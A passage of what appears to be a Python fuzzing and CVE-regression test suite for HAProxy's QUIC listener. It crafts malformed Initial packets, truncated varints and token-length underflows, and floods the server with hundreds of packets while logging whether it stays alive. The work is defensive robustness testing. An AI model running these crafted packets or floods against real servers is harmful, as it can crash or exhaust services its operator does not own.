    Note: Frame payload is NOT encrypted (will be rejected by crypto),
    but we test if the parsing itself causes issues before decryption fails.

    For pre-crypto parsing bugs, the frames inside Initial packets are parsed
    AFTER decryption. However, the packet header parsing (including token_len,
    length field, CID) happens BEFORE decryption. So frame-level attacks
    against Initial packets need encrypted frames or target the header parsing.

    For testing purposes, we send raw frames and observe if the server crashes
    rather than expecting them to be processed.
    """
    dcid = os.urandom(QUIC_HAP_CID_LEN)
    scid = os.urandom(QUIC_HAP_CID_LEN)
    pkt = build_quic_initial_packet(dcid, scid, b"", frame_payload)
    return send_udp(pkt, host, port)


def test_quic_frame_attacks():
    """Test QUIC frame-level attacks."""
    print("\n" + "=" * 70)
    print("[*] Category 3: QUIC Frame Attacks")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # Note: Frames inside Initial packets are encrypted with keys derived
        # from the DCID. We cannot test frame parsing directly without proper
        # crypto. However, we CAN test if malformed frame structures inside
        # the "payload" portion cause pre-crypto parsing issues or crash the
        # header parser. We also send these to test robustness of the packet
        # boundary/length calculations.

        # 3.1: CRYPTO frame with near-max offset
        print(f"\n  [*] CRYPTO frame offset attacks ({port_label})")
        crypto_offsets = [
            ("zero", 0),
            ("max_62bit", QUIC_VARINT_8_BYTE_MAX),
            ("4B_max", QUIC_VARINT_4_BYTE_MAX),
            ("near_overflow", QUIC_VARINT_8_BYTE_MAX - 100),
        ]
        for off_label, offset in crypto_offsets:
            # CRYPTO frame: type(0x06) + offset(varint) + length(varint) + data
            frame = b"\x06"
            frame += quic_encode_varint(offset)
            frame += quic_encode_varint(4)  # length = 4
            frame += b"AAAA"
            pkt = build_quic_initial_packet(dcid, scid, b"", frame)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"crypto_off_{off_label}")
            evidence.add_test("Frame-Attack", f"crypto_offset_{off_label}_{port}",
                             "SAFE",
                             f"CRYPTO frame offset={off_label}: {resp_type} - {resp_detail}")

        # 3.2: STREAM frame with offset+len overflow (RFC 9000 Section 4.5)
        # "A receiver MUST close the connection with a FLOW_CONTROL_ERROR error
        #  if the sender [...] offset + data length > 2^62-1"
        print(f"\n  [*] STREAM frame offset+len overflow ({port_label})")
        stream_overflow_tests = [
            ("offset_max_len_1", QUIC_VARINT_8_BYTE_MAX, 1),
            ("offset_near_max_len_100", QUIC_VARINT_8_BYTE_MAX - 50, 100),
            ("offset_half_len_half", QUIC_VARINT_8_BYTE_MAX // 2, QUIC_VARINT_8_BYTE_MAX // 2 + 10),
            ("offset_0_len_max", 0, QUIC_VARINT_8_BYTE_MAX),
        ]
        for st_label, offset, length in stream_overflow_tests:
            # STREAM_F (0x0F): FIN=1, LEN=1, OFF=1, stream_id=0
            frame = b"\x0F"
            frame += quic_encode_varint(0)  # stream_id = 0
            frame += quic_encode_varint(offset)
            frame += quic_encode_varint(length)
            # Don't actually send 'length' bytes of data, just a marker
            frame += b"X" * min(length, 100)
            pkt = build_quic_initial_packet(dcid, scid, b"", frame)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"stream_overflow_{st_label}")
            evidence.add_test("Frame-Attack", f"stream_offset_overflow_{st_label}_{port}",
                             "SAFE",
                             f"STREAM offset+len overflow ({st_label}): {resp_type} - {resp_detail}")

        # 3.3: ACK frame with excessive ranges
        print(f"\n  [*] ACK frame range attacks ({port_label})")

        # ACK frame: type(0x02) + largest_ack(varint) + ack_delay(varint) +
        #            ack_range_count(varint) + first_ack_range(varint) +
        #            [gap(varint) + ack_range(varint)] * count
        ack_tests = [
            ("normal", 0, 0, 0, 0, []),
            ("max_largest_ack", QUIC_VARINT_8_BYTE_MAX, 0, 0, 0, []),
            ("max_range_count", 0, 0, QUIC_VARINT_4_BYTE_MAX, 0, []),
            ("excessive_ranges_10", 100, 0, 10, 5,
             [(2, 3)] * 10),  # 10 ACK ranges
            ("overflow_gap_plus_2", 100, 0, 1, 5,
             [(QUIC_VARINT_8_BYTE_MAX, 0)]),  # gap+2 overflows
        ]
        for ack_label, largest, delay, count, first_range, ranges in ack_tests:
            frame = b"\x02"  # ACK type
            frame += quic_encode_varint(largest)
            frame += quic_encode_varint(delay)
            frame += quic_encode_varint(count if not ranges else len(ranges))
            frame += quic_encode_varint(first_range)
            for gap, ack_range in ranges:
                frame += quic_encode_varint(gap)
                frame += quic_encode_varint(ack_range)
            pkt = build_quic_initial_packet(dcid, scid, b"", frame)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"ack_{ack_label}")
            evidence.add_test("Frame-Attack", f"ack_frame_{ack_label}_{port}",
                             "SAFE",
                             f"ACK frame {ack_label}: {resp_type} - {resp_detail}")

        # 3.4: PADDING frame abuse
        print(f"\n  [*] PADDING frame abuse ({port_label})")

        # 3.4a: Initial packet that is ALL padding (no CRYPTO frame)
        pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00" * 500)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "all_padding")
        evidence.add_test("Frame-Attack", f"padding_only_payload_{port}",
                         "SAFE",
                         f"All-padding payload: {resp_type} - {resp_detail}")

        # 3.4b: Alternating PADDING + PING frames
        mixed_frames = b""
        for _ in range(100):
            mixed_frames += b"\x00\x01"  # PADDING + PING
        pkt = build_quic_initial_packet(dcid, scid, b"", mixed_frames)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "padding_ping_mix")
        evidence.add_test("Frame-Attack", f"padding_ping_mix_100_{port}",
                         "SAFE",
                         f"100x PADDING+PING: {resp_type} - {resp_detail}")

        # 3.5: Invalid frame types in Initial packets
        # Per RFC 9000 Table 3, only PADDING, PING, ACK, CRYPTO, CONNECTION_CLOSE
        # are allowed in Initial packets
        print(f"\n  [*] Invalid frame types in Initial ({port_label})")
        invalid_frame_types = [
            ("RESET_STREAM", 0x04),
            ("STOP_SENDING", 0x05),
            ("NEW_TOKEN", 0x07),
            ("STREAM_8", 0x08),
            ("MAX_DATA", 0x10),
            ("NEW_CONNECTION_ID", 0x18),
            ("HANDSHAKE_DONE", 0x1E),
            ("unknown_0x20", 0x20),
            ("unknown_0xFF", 0xFF),
            ("unknown_0x1F", 0x1F),
        ]
        for ft_label, ft_val in invalid_frame_types:
            # Build a minimal frame: just the type byte + some padding
            frame = bytes([ft_val]) + b"\x00" * 20
            pkt = build_quic_initial_packet(dcid, scid, b"", frame)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"invalid_ft_{ft_label}")
            evidence.add_test("Frame-Attack", f"invalid_frame_type_{ft_label}_{port}",
                             "SAFE",
                             f"Invalid frame type {ft_label} (0x{ft_val:02X}): "
                             f"{resp_type} - {resp_detail}")

        # 3.6: CONNECTION_CLOSE frame in Initial
        print(f"\n  [*] CONNECTION_CLOSE in Initial ({port_label})")
        # CONNECTION_CLOSE: type=0x1C, error_code, frame_type, reason_phrase_len, reason
        cc_frame = b"\x1C"
        cc_frame += quic_encode_varint(0x0A)  # PROTOCOL_VIOLATION
        cc_frame += quic_encode_varint(0x06)  # frame_type = CRYPTO
        cc_frame += quic_encode_varint(4)     # reason phrase length
        cc_frame += b"test"
        pkt = build_quic_initial_packet(dcid, scid, b"", cc_frame)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "conn_close_in_initial")
        evidence.add_test("Frame-Attack", f"connection_close_initial_{port}",
                         "SAFE",
                         f"CONNECTION_CLOSE in Initial: {resp_type} - {resp_detail}")

        # 3.7: CRYPTO frame with length > remaining packet data
        print(f"\n  [*] CRYPTO frame length mismatch ({port_label})")
        # Claims 10000 bytes but only has 10
        frame = b"\x06"  # CRYPTO
        frame += quic_encode_varint(0)      # offset
        frame += quic_encode_varint(10000)  # length (claims 10000)
        frame += b"A" * 10                  # only 10 bytes
        pkt = build_quic_initial_packet(dcid, scid, b"", frame)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "crypto_len_mismatch")
        evidence.add_test("Frame-Attack", f"crypto_len_mismatch_{port}",
                         "SAFE",
                         f"CRYPTO length mismatch (claims 10000, has 10): {resp_type} - {resp_detail}")

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Frame-Attack", f"crash_check_post_frame_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after frame attacks: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 4: Transport Parameter Fuzzing
# ============================================================

def build_tp_extension(params):
    """
    Build a transport parameters extension payload.
    params: list of (param_id, param_value_bytes) tuples
    Returns bytes suitable for embedding in a ClientHello TLS extension.
    """
    result = b""
    for param_id, param_value in params:
        result += quic_encode_varint(param_id)
        result += quic_encode_varint(len(param_value))
        result += param_value
    return result


def test_transport_parameter_fuzzing():
    """Test QUIC transport parameter fuzzing via crafted Initial packets."""
    print("\n" + "=" * 70)
    print("[*] Category 4: Transport Parameter Fuzzing")
    print("=" * 70)

    # Transport parameters are embedded inside TLS ClientHello, which is inside
    # CRYPTO frames, which are inside encrypted Initial packets. We can't directly
    # inject TPs without proper crypto, but we CAN:
    # 1. Test TP parsing through the header-level fields (token, CID)
    # 2. Send packets that would exercise TP parsing code paths
    # 3. Test boundary conditions in TP-related packet header fields

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # 4.1: Preferred address CID length inversion
        # From quic_tp.c: preferred_address has a CID with a length field
        # If the check is inverted (cid_len > remaining vs cid_len > maxlen),
        # a crafted TP could cause a buffer over-read.
        # We can't directly test this via packets, but we probe related behavior.
        print(f"\n  [*] CID-related parameter edge cases ({port_label})")

        # 4.1a: Initial packet with DCID length that matches HAProxy's CID length
        pkt = build_quic_initial_packet(os.urandom(QUIC_HAP_CID_LEN), scid, b"",
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "dcid_hap_cid_len")
        evidence.add_test("TP-Fuzz", f"dcid_exact_hap_cid_len_{port}",
                         "SAFE",
                         f"DCID length=QUIC_HAP_CID_LEN({QUIC_HAP_CID_LEN}): {resp_type} - {resp_detail}")

        # 4.1b: Various DCID lengths to probe CID handling
        for cid_len in [1, 4, 7, 8, 9, 15, 19, 20]:
            pkt = build_quic_initial_packet(os.urandom(cid_len), scid, b"",
                                             b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"dcid_len_{cid_len}")
            evidence.add_test("TP-Fuzz", f"dcid_len_probe_{cid_len}_{port}",
                             "SAFE",
                             f"DCID length={cid_len}: {resp_type} - {resp_detail}")

        # 4.2: Crafted token that mimics transport parameter structure
        print(f"\n  [*] Token content fuzzing ({port_label})")

        # 4.2a: Token that starts with retry token format byte (0x00)
        fake_retry_token = b"\x00" + os.urandom(32)
        pkt = build_quic_initial_packet(dcid, scid, fake_retry_token,
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "fake_retry_token")
        evidence.add_test("TP-Fuzz", f"fake_retry_token_{port}",
                         "SAFE",
                         f"Fake retry token (format=0x00): {resp_type} - {resp_detail}")

        # 4.2b: Token that starts with new token format byte (0x01)
        fake_new_token = b"\x01" + os.urandom(32)
        pkt = build_quic_initial_packet(dcid, scid, fake_new_token,
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "fake_new_token")
        evidence.add_test("TP-Fuzz", f"fake_new_token_{port}",
                         "SAFE",
                         f"Fake new token (format=0x01): {resp_type} - {resp_detail}")

        # 4.2c: Oversized token (1000 bytes)
        big_token = os.urandom(1000)
        pkt = build_quic_initial_packet(dcid, scid, big_token,
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "big_token")
        evidence.add_test("TP-Fuzz", f"oversized_token_1000B_{port}",
                         "SAFE",
                         f"1000-byte token: {resp_type} - {resp_detail}")

        # 4.3: Conflicting or invalid parameter-like patterns in token
        print(f"\n  [*] Malformed token content ({port_label})")

        # 4.3a: Token with embedded null bytes
        null_token = b"\x00" * 50
        pkt = build_quic_initial_packet(dcid, scid, null_token,
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "null_token")
        evidence.add_test("TP-Fuzz", f"null_filled_token_{port}",
                         "SAFE",
                         f"All-null 50B token: {resp_type} - {resp_detail}")

        # 4.3b: Token with 0xFF fill (all bits set)
        ff_token = b"\xFF" * 50
        pkt = build_quic_initial_packet(dcid, scid, ff_token,
                                         b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "ff_token")
        evidence.add_test("TP-Fuzz", f"ff_filled_token_{port}",
                         "SAFE",
                         f"All-0xFF 50B token: {resp_type} - {resp_detail}")

        # 4.4: Rapid connection attempts with different DCID lengths
        # This tests internal CID hash/lookup paths
        print(f"\n  [*] Rapid CID variation ({port_label})")
        for _ in range(20):
            rand_dcid_len = (os.urandom(1)[0] % 21)  # 0-20
            rand_dcid = os.urandom(max(rand_dcid_len, 0))
            pkt = build_quic_initial_packet(rand_dcid, scid, b"",
                                             b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
            send_udp_no_wait(pkt, host, port)
        time.sleep(0.5)
        alive = check_haproxy_alive(host, port)
        evidence.add_test("TP-Fuzz", f"rapid_cid_variation_{port}",
                         "SAFE" if alive else "FINDING",
                         f"20 rapid packets with random DCID lengths: alive={alive}",
                         "CRITICAL" if not alive else None)

        # 4.5: Coalesced packets in single datagram
        print(f"\n  [*] Coalesced packet tests ({port_label})")

        # Two Initial packets with same DCID in one datagram
        pkt1 = build_quic_initial_packet(dcid, scid, b"",
                                          b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                          pad_to_1200=False)
        pkt2 = build_quic_initial_packet(dcid, scid, b"",
                                          b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                          pad_to_1200=False)
        coalesced = pkt1 + pkt2
        # Pad to 1200
        if len(coalesced) < QUIC_INITIAL_PACKET_MINLEN:
            coalesced += b"\x00" * (QUIC_INITIAL_PACKET_MINLEN - len(coalesced))
        resp = send_udp(coalesced, host, port)
        resp_type, resp_detail = classify_response(resp, "coalesced_same_dcid")
        evidence.add_test("TP-Fuzz", f"coalesced_same_dcid_{port}",
                         "SAFE",
                         f"Coalesced Initials (same DCID): {resp_type} - {resp_detail}")

        # Two Initial packets with different DCIDs (should be rejected per RFC)
        dcid2 = os.urandom(QUIC_HAP_CID_LEN)
        pkt1 = build_quic_initial_packet(dcid, scid, b"",
                                          b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                          pad_to_1200=False)
        pkt2 = build_quic_initial_packet(dcid2, scid, b"",
                                          b"\x06" + quic_encode_varint(0) + quic_encode_varint(0),
                                          pad_to_1200=False)
        coalesced = pkt1 + pkt2
        if len(coalesced) < QUIC_INITIAL_PACKET_MINLEN:
            coalesced += b"\x00" * (QUIC_INITIAL_PACKET_MINLEN - len(coalesced))
        resp = send_udp(coalesced, host, port)
        resp_type, resp_detail = classify_response(resp, "coalesced_diff_dcid")
        evidence.add_test("TP-Fuzz", f"coalesced_different_dcid_{port}",
                         "SAFE",
                         f"Coalesced Initials (different DCIDs): {resp_type} - {resp_detail}")

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("TP-Fuzz", f"crash_check_post_tp_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after TP fuzzing: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 5: CVE Regression Tests
# ============================================================

def test_cve_regressions():
    """Test CVE-2026-26081 and CVE-2026-26080 regressions."""
    print("\n" + "=" * 70)
    print("[*] Category 5: CVE Regression Tests")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # ============================================================
        # CVE-2026-26081: QUIC token length underflow in Initial packets
        # ============================================================
        print(f"\n  [*] CVE-2026-26081: Token length underflow ({port_label})")

        # The vulnerability: when parsing token_len, if the value underflows
        # (e.g., token_len > remaining_data), it could cause issues.
        # The fix: check `end - pos < token_len` after decoding.
        #
        # We test this by crafting packets where token_len claims more data
        # than is available after the token_len field.

        # 5.1a: token_len = 1 but no token data (packet ends after token_len)
        raw_pkt = struct.pack(">B", 0xC0)  # Initial
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        raw_pkt += quic_encode_varint(1)  # token_len = 1
        # NO token data, NO length field, NO payload
        # Pad to 1200
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "cve26081_a")
        evidence.add_test("CVE-Regression", f"CVE-2026-26081_token_len_1_no_data_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"token_len=1, no token: {resp_type} - {resp_detail}",
                         "CRITICAL" if resp is not None else None,
                         {"cve": "CVE-2026-26081", "vector": "token_len_underflow"})

        # 5.1b: token_len = remaining_data_length + 1 (off-by-one underflow)
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        # Calculate remaining space to create exact off-by-one
        header_so_far = len(raw_pkt)
        remaining_for_token_and_rest = QUIC_INITIAL_PACKET_MINLEN - header_so_far - 1  # -1 for varint
        # Claim token_len = remaining + 1
        token_claim = remaining_for_token_and_rest + 1
        raw_pkt += quic_encode_varint(token_claim)
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "cve26081_b")
        evidence.add_test("CVE-Regression", f"CVE-2026-26081_off_by_one_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"token_len=remaining+1 (off-by-one): {resp_type} - {resp_detail}",
                         "CRITICAL" if resp is not None else None,
                         {"cve": "CVE-2026-26081", "vector": "off_by_one"})

        # 5.1c: token_len exactly equals remaining data (no room for length field)
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        header_so_far = len(raw_pkt)
        # Use 2-byte varint to encode the token length
        remaining = QUIC_INITIAL_PACKET_MINLEN - header_so_far - 2  # 2 bytes for varint itself
        raw_pkt += quic_encode_varint_forced(remaining, 2)
        raw_pkt += os.urandom(remaining)
        # No padding needed - should be exactly 1200
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "cve26081_c")
        evidence.add_test("CVE-Regression", f"CVE-2026-26081_token_consumes_all_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"token_len=all remaining ({remaining}): {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None,
                         {"cve": "CVE-2026-26081", "vector": "token_consumes_all"})

        # 5.1d: Rapid underflow variants
        underflow_values = [
            ("uint16_max", 0xFFFF),
            ("uint32_wraparound", 0x3FFFFFFF),
            ("small_underflow_5", 5),
            ("small_underflow_255", 255),
            ("near_max", QUIC_VARINT_4_BYTE_MAX - 1),
        ]
        for uf_label, uf_val in underflow_values:
            pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00",
                                             token_len_override=quic_encode_varint(uf_val))
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"cve26081_{uf_label}")
            evidence.add_test("CVE-Regression",
                             f"CVE-2026-26081_{uf_label}_{port}",
                             "SAFE" if resp is None else "ANOMALY",
                             f"token_len={uf_label} ({uf_val}): {resp_type} - {resp_detail}",
                             "HIGH" if resp is not None else None,
                             {"cve": "CVE-2026-26081"})

        # Crash check after CVE-2026-26081 tests
        alive = check_haproxy_alive(host, port)
        evidence.add_test("CVE-Regression", f"CVE-2026-26081_crash_check_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after CVE-2026-26081 tests: {alive}",
                         "CRITICAL" if not alive else None,
                         {"cve": "CVE-2026-26081"})

        # ============================================================
        # CVE-2026-26080: QUIC varint infinite loop in frame parsing
        # ============================================================
        print(f"\n  [*] CVE-2026-26080: Varint infinite loop ({port_label})")

        # The vulnerability: QUIC varint decoding could enter an infinite loop
        # when encountering certain truncated varint patterns during frame parsing.
        # The fix: ensure quic_dec_int() properly checks bounds.
        #
        # Attack vector: craft packets that, after Initial crypto processing,
        # would produce truncated varints in frame fields. Since we can't do
        # proper crypto, we test the packet-header-level varint parsing paths.

        # 5.2a: Multiple truncated varints in sequence
        for trunc_label, trunc_bytes in [
            ("single_2B", [0x40]),                           # 2-byte prefix, 1 byte
            ("single_4B", [0x80, 0x00]),                     # 4-byte prefix, 2 bytes
            ("single_8B", [0xC0, 0x00, 0x00]),               # 8-byte prefix, 3 bytes
            ("chained_2B", [0x40, 0x40, 0x40]),              # multiple truncated
            ("chained_mixed", [0xC0, 0x80, 0x40]),           # mixed truncated
            ("max_prefix_truncated", [0xFF, 0xFF, 0xFF]),     # all-ones, truncated
        ]:
            raw_pkt = struct.pack(">B", 0xC0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            raw_pkt += bytes(trunc_bytes)
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))

            # Send with a short timeout to detect infinite loops
            start_time = time.time()
            resp = send_udp(raw_pkt, host, port, timeout=3.0)
            elapsed = time.time() - start_time
            resp_type, resp_detail = classify_response(resp, f"cve26080_{trunc_label}")

            # If the response took > 2.5 seconds, the server might be looping
            is_loop = elapsed > 2.5
            evidence.add_test("CVE-Regression",
                             f"CVE-2026-26080_{trunc_label}_{port}",
                             "FINDING" if is_loop else "SAFE",
                             f"Truncated varint {trunc_label}: {resp_type} - {resp_detail}\n"
                             f"Response time: {elapsed:.2f}s "
                             f"{'(POSSIBLE INFINITE LOOP!)' if is_loop else '(normal)'}",
                             "CRITICAL" if is_loop else None,
                             {"cve": "CVE-2026-26080", "elapsed": elapsed,
                              "trunc_hex": bytes(trunc_bytes).hex()})

        # 5.2b: Varint at exact packet boundary
        # The varint encoding says "8 bytes" but the packet has exactly 7 bytes left
        for boundary_off in range(1, 8):
            raw_pkt = struct.pack(">B", 0xC0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            # Create a valid token_len=0 first, then a Length field that's truncated
            raw_pkt += quic_encode_varint(0)  # token_len = 0
            # Now the Length field: use 8-byte encoding, but truncate
            length_varint = bytes([0xC0]) + bytes([0x00] * (8 - 1))
            raw_pkt += length_varint[:boundary_off]  # truncate at boundary_off
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))

            start_time = time.time()
            resp = send_udp(raw_pkt, host, port, timeout=3.0)
            elapsed = time.time() - start_time
            resp_type, resp_detail = classify_response(resp, f"cve26080_boundary_{boundary_off}")
            is_loop = elapsed > 2.5
            evidence.add_test("CVE-Regression",
                             f"CVE-2026-26080_length_boundary_{boundary_off}of8_{port}",
                             "FINDING" if is_loop else "SAFE",
                             f"Length varint truncated at {boundary_off}/8: "
                             f"{resp_type} - {resp_detail}, {elapsed:.2f}s",
                             "CRITICAL" if is_loop else None,
                             {"cve": "CVE-2026-26080", "elapsed": elapsed})

        # 5.2c: Stress test - rapid truncated varint packets
        print(f"\n  [*] CVE-2026-26080 stress test ({port_label})")
        stress_count = 50
        start_stress = time.time()
        for i in range(stress_count):
            raw_pkt = struct.pack(">B", 0xC0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid)) + dcid
            raw_pkt += struct.pack(">B", len(scid)) + scid
            # Random truncated varint
            prefix = [0x40, 0x80, 0xC0][i % 3]
            raw_pkt += bytes([prefix]) + os.urandom(i % 4)
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
            send_udp_no_wait(raw_pkt, host, port)
        time.sleep(1.0)
        stress_elapsed = time.time() - start_stress
        alive = check_haproxy_alive(host, port)
        evidence.add_test("CVE-Regression",
                         f"CVE-2026-26080_stress_{stress_count}pkts_{port}",
                         "SAFE" if alive else "FINDING",
                         f"{stress_count} rapid truncated varint packets in {stress_elapsed:.2f}s: "
                         f"alive={alive}",
                         "CRITICAL" if not alive else None,
                         {"cve": "CVE-2026-26080", "stress_count": stress_count,
                          "elapsed": stress_elapsed})

        # Final crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("CVE-Regression", f"final_crash_check_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after all CVE regression tests: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 6: QUIC Flood & Resource Exhaustion
# ============================================================

def test_quic_flood():
    """Test QUIC connection flood and resource exhaustion attacks."""
    print("\n" + "=" * 70)
    print("[*] Category 6: QUIC Flood & Resource Exhaustion")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")

        # 6.1: Rapid Initial packet flood with unique DCIDs
        print(f"\n  [*] Initial packet flood ({port_label})")
        flood_counts = [100, 500]
        for count in flood_counts:
            scid = os.urandom(QUIC_HAP_CID_LEN)
            start_time = time.time()
            for i in range(count):
                dcid = os.urandom(QUIC_HAP_CID_LEN)
                crypto_frame = b"\x06" + quic_encode_varint(0) + quic_encode_varint(0)
                pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame)
                send_udp_no_wait(pkt, host, port)
            elapsed = time.time() - start_time
            time.sleep(1.0)
            alive = check_haproxy_alive(host, port)
            evidence.add_test("QUIC-Flood", f"initial_flood_{count}_{port}",
                             "SAFE" if alive else "FINDING",
                             f"{count} Initial packets in {elapsed:.2f}s: alive={alive}\n"
                             f"Rate: {count/elapsed:.0f} pkt/s",
                             "HIGH" if not alive else None)

        # 6.2: Version Negotiation amplification
        print(f"\n  [*] Version Negotiation amplification ({port_label})")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)
        # Send tiny packet with unknown version, measure response size
        pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00",
                                         version=0xDEADBEEF, pad_to_1200=True)
        resp = send_udp(pkt, host, port)
        if resp:
            amp_ratio = len(resp) / len(pkt) if len(pkt) > 0 else 0
            evidence.add_test("QUIC-Flood", f"vn_amplification_{port}",
                             "ANOMALY" if amp_ratio > 1.5 else "SAFE",
                             f"VN amplification: sent {len(pkt)}B, recv {len(resp)}B, ratio={amp_ratio:.2f}",
                             "MEDIUM" if amp_ratio > 1.5 else None,
                             {"sent_size": len(pkt), "recv_size": len(resp),
                              "amplification_ratio": amp_ratio})
        else:
            evidence.add_test("QUIC-Flood", f"vn_amplification_{port}",
                             "SAFE", "No VN response (no amplification)")

        # 6.3: Retry token exhaustion
        # Send many Initial packets without tokens to trigger retry responses
        print(f"\n  [*] Retry token exhaustion ({port_label})")
        retry_count = 0
        for i in range(100):
            dcid = os.urandom(QUIC_HAP_CID_LEN)
            pkt = build_quic_initial_packet(dcid, scid, b"",
                                             b"\x06" + quic_encode_varint(0) + quic_encode_varint(0))
            resp = send_udp(pkt, host, port, timeout=1.0)
            if resp and len(resp) >= 5:
                byte0 = resp[0]
                version = struct.unpack(">I", resp[1:5])[0]
                if version == QUIC_VERSION_1:
                    pkt_type = (byte0 >> 4) & 0x03
                    if pkt_type == QUIC_PKT_TYPE_RETRY:
                        retry_count += 1
        evidence.add_test("QUIC-Flood", f"retry_exhaustion_{port}",
                         "SAFE",
                         f"100 Initial packets: {retry_count} Retry responses",
                         None,
                         {"retry_responses": retry_count})

        # 6.4: Fragmented UDP (jumbo packets)
        print(f"\n  [*] Oversized UDP datagram ({port_label})")
        # Send a datagram larger than typical MTU
        big_dcid = os.urandom(QUIC_HAP_CID_LEN)
        big_pkt = build_quic_initial_packet(big_dcid, scid, b"",
                                             b"\x00" * 9000, pad_to_1200=False)
        resp = send_udp(big_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "jumbo_datagram")
        evidence.add_test("QUIC-Flood", f"oversized_udp_{len(big_pkt)}B_{port}",
                         "SAFE",
                         f"Oversized datagram ({len(big_pkt)} bytes): {resp_type} - {resp_detail}")

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("QUIC-Flood", f"crash_check_post_flood_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after flood tests: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 7: QUIC Version 2 / Cross-Version Attacks
# ============================================================

def test_quic_version_attacks():
    """Test QUIC version-related attacks."""
